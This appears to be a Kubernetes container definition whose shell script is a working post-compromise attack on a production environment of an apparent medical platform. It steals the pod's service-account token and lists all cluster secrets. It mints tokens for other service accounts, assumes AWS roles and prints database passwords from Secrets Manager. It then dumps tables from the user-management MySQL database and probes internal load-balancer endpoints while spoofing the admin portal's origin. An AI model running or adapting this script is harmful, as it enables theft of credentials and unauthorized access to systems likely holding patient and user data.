containers.name: probe
args:
#!/bin/sh
set -u
ENV="prod"
PORTAL_ORIGIN="https://admin.prod01.lazamedical.ai"
echo "===I2822A_START env=$ENV host=$(hostname) utc=$(date -u +%FT%TZ)==="
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
apk add --no-cache curl jq aws-cli mariadb-client >/tmp/apk.log 2>&1; echo "apk_rc=$?"
for b in curl jq aws mysql; do command -v $b >/dev/null 2>&1 && echo "have $b" || echo "MISSING $b"; done

get(){ curl -s -m 20 -k -H "Authorization: Bearer $TOKEN" "$1"; }
post(){ curl -s -m 20 -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST -d "$2" "$1"; }

echo "===STEP1_SECRETS==="
get "$API/api/v1/secrets?limit=2000" > /tmp/secrets.json
echo "SECRETS_BYTES=$(wc -c < /tmp/secrets.json)"
: > /tmp/dbfiles.txt
for ns in $(jq -r '.items[] | select(.metadata.name=="rds-secrets") | .metadata.namespace' /tmp/secrets.json 2>/dev/null | sort -u); do
  RD=$(jq -r --arg ns "$ns" '.items[]|select(.metadata.name=="rds-secrets" and .metadata.namespace==$ns)|(.data//{})|to_entries[]|select(.key=="SECRET_NAME")|.value|@base64d' /tmp/secrets.json 2>/dev/null | head -1)
  RG=$(jq -r --arg ns "$ns" '.items[]|select(.metadata.name=="rds-secrets" and .metadata.namespace==$ns)|(.data//{})|to_entries[]|select(.key=="REGION")|.value|@base64d' /tmp/secrets.json 2>/dev/null | head -1)
  [ -z "$RD" ] && continue
  [ -z "$RG" ] && RG=us-west-2
  echo "==NS $ns SECRET=$RD REGION=$RG"
  SAS=$(get "$API/api/v1/namespaces/$ns/serviceaccounts")
  SAN=$(echo "$SAS" | jq -r '.items[]|select(.metadata.annotations["eks.amazonaws.com/role-arn"]!=null)|.metadata.name' 2>/dev/null | head -1)
  ROLE=$(echo "$SAS" | jq -r --arg san "$SAN" '.items[]|select(.metadata.name==$san)|.metadata.annotations["eks.amazonaws.com/role-arn"] // empty' 2>/dev/null | head -1)
  [ -z "$SAN" ] && { echo "NO_IRSA_SA_IN_$ns"; continue; }
  echo "SA=$SAN"
  TK=$(post "$API/api/v1/namespaces/$ns/serviceaccounts/$SAN/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty' 2>/dev/null)
  [ -z "$WT" ] && { echo "TOKEN_REQ_FAIL"; continue; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name i2822probe --web-identity-token "$WT" --duration-seconds 900 --region "$RG" --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $(echo $RES|head -c 300)"; continue; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES"|jq -r '.Credentials.AccessKeyId')
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES"|jq -r '.Credentials.SecretAccessKey')
  export AWS_SESSION_TOKEN=$(echo "$RES"|jq -r '.Credentials.SessionToken')
  echo "ASSUME_OK"
  OUT=$(aws secretsmanager get-secret-value --secret-id "$RD" --region "$RG" --query SecretString --output text 2>&1)
  echo "===DBSECRET $ns $RD==="
  echo "$OUT" | head -c 1500
  echo ""
  echo "$OUT" > "/tmp/db_${ns}.json"
  echo "/tmp/db_${ns}.json" >> /tmp/dbfiles.txt
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
done

echo "===STEP2_MYSQL==="
for f in $(cat /tmp/dbfiles.txt 2>/dev/null); do
  DB=$(jq -r '.dbname // empty' "$f" 2>/dev/null)
  [ "$DB" = "user_management" ] || { echo "SKIP_DB $(basename $f) db=$DB"; continue; }
  H=$(jq -r '.host // empty' "$f"); P=$(jq -r '.port // 3306' "$f"); U=$(jq -r '.username // empty' "$f"); PW=$(jq -r '.password // empty' "$f")
  [ -z "$H" ] || [ -z "$PW" ] && { echo "MISSING_DB_FIELDS $(basename $f)"; continue; }
  export MYSQL_PWD="$PW"
  MI(){ timeout 60 mysql --connect-timeout=12 --protocol=tcp -h "$H" -P "$P" -u "$U" -D "$DB" --batch --raw -N -e "$1" 2>&1; }
  echo "===MYSQL user_management $H:$P user=$U==="
  MI "SELECT VERSION(), CURRENT_USER(), DATABASE();"
  echo "---TABLES---"
  MI "SHOW TABLES"
  echo "---COUNTS---"
  MI "SELECT 'api_endpoint' t, COUNT(*) n FROM api_endpoint UNION ALL SELECT 'module',COUNT(*) FROM module UNION ALL SELECT 'component',COUNT(*) FROM component UNION ALL SELECT 'role',COUNT(*) FROM role;"
  echo "---API_ENDPOINT_ALL---"
  MI "SELECT id, api_endpoint, endpoint_name, http_method, module_id FROM api_endpoint ORDER BY id"
  echo "---MODULE---"
  MI "SELECT * FROM module ORDER BY 1"
  echo "---COMPONENT_50---"
  MI "SELECT * FROM component ORDER BY 1 LIMIT 50"
  echo "---ROLE_50---"
  MI "SELECT * FROM role ORDER BY 1 LIMIT 50"
  echo "---SETTINGS_30---"
  MI "SELECT * FROM settings ORDER BY 1 LIMIT 30"
  echo "---EMAIL_TEMPLATE_30---"
  MI "SELECT * FROM email_template ORDER BY 1 LIMIT 30"
  echo "---DB_END---"
  unset MYSQL_PWD
done
echo "===STEP2_DONE==="

echo "===STEP3_HTTP_BEGIN==="
probe(){
  t=$1; lab=$2; shift 2
  for p in "$@"; do
    B=/tmp/b.$$
    code=$(curl -s -m 6 -o "$B" -w '%{http_code}|%{size_download}|%{content_type}' -H "Origin: $PORTAL_ORIGIN" -H "Referer: $PORTAL_ORIGIN/" "http://$t$p" 2>/dev/null); rc=$?
    echo "HIT [$lab] $p rc=$rc -> $code :: $(head -c 200 "$B" 2>/dev/null | tr '\r\n' ' ')"
    rm -f "$B"
  done
}
probe 'lazamedical-prod01-usw2-user-bca7706c3b655a63.elb.us-west-2.amazonaws.com' prod-elb-user '/api/v1/role/data/processing/status' '/api/v1/role/list' '/api/v1/account/list' '/api/v1/account/type/list' '/api/v1/components' '/api/v1/module/list' '/api/v1/user/list' '/api/v1/user/basic' '/api/v1/email-template/list' '/swagger/api-docs'
probe 'lazamedical-dp-prod01-usw2-s3-2a3b26f15d64ba78.elb.us-west-2.amazonaws.com' prod-elb-s3 '/health' '/health/liveness' '/health/readiness' '/docs' '/openapi.json' '/redoc' '/'
probe 'lazamedical-prod01-usw2-notif-eafa1811fd6f6f78.elb.us-west-2.amazonaws.com' prod-elb-notif '/api/v1/version' '/api/v1/getTemplate?templateName=welcome' '/api/v1/getTemplate?templateName=passwordReset' '/api/v1/getTemplate?templateName=reset_password' '/swagger/api-docs' '/actuator/health' '/health'
probe 'lazamedical-dp-prod01-usw2-meta-149485d8eeef4b86.elb.us-west-2.amazonaws.com' prod-elb-meta '/health' '/health/liveness' '/health/readiness' '/docs' '/openapi.json' '/redoc' '/public'
probe 'lazamedical-dp-prod01-usw2-deid-f957f3b6a98392fd.elb.us-west-2.amazonaws.com' prod-elb-deid '/health' '/health/liveness' '/health/readiness' '/docs' '/openapi.json' '/redoc' '/public'
probe 'lazamedical-dp-prod01-usw2-data-c6480e54a84f2644.elb.us-west-2.amazonaws.com' prod-elb-data '/api/v1/health' '/api/v1/dataset/list' '/api/v1/site/list' '/api/v1/user/preset' '/api/v1/download/history' '/api/v1/filter/field/list' '/swagger/api-docs' '/actuator/health'
probe 'lazamedical-prod01-usw2-auth-8ba7c7856a888742.elb.us-west-2.amazonaws.com' prod-elb-auth '/auth/password/policy' '/auth/check' '/swagger/api-docs' '/actuator/health' '/health' '/auth/user'
probe 'lazamedical-prod01-usw2-authz-b28f0d1484208416.elb.us-west-2.amazonaws.com' prod-elb-authz '/api/v1/health' '/api/v1/authorize' '/swagger/api-docs' '/actuator/health' '/health'
echo "===STEP3_HTTP_END==="
echo "===I2822A_DONE env=$ENV utc=$(date -u +%FT%TZ)==="
